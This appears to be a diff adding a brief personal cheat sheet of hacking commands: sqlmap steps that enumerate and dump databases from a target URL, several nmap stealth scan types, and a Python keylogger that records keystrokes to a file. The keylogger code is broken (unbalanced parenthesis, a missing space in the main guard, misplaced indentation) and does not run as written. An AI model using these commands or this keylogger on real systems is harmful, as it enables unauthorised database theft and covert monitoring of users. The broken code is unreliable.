@@ -1,0 +1,35 @@
+SQL injection
+1)git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+2)python sqlmap.py -h
+3)python sqlmap.py -u <url> --batch --dbs
+4)python sqlmap.py -u <url> --batch -D database_name --tables
+5)python sqlmap.py -u <url> --batch -D database_name -T table-name --columns
+6)python sqlmap.py -u <url> --batch -D database_name -T table-name --columns_name --dump
+
+
+
+Port scanning using NMAP
+nmap -sA ip
+nmap -sS ip
+nmap -sF ip
+nmap -sN ip
+nmap -sX ip
+
+keylogger
+from pynput import keyboard
+def keyPressed(key):
+    print(str(key)
+    with open("keyfile.txt",'a')as logKey:
+       try:
+          char=key.char
+          logKey.write(char)
+       except:
+          print("Error getting char")
+if__name__=="__main__":
+  listener=keyboard.Listener(on_press=keyPressed)
+  listener.start()
+      input()
+
+
+
+
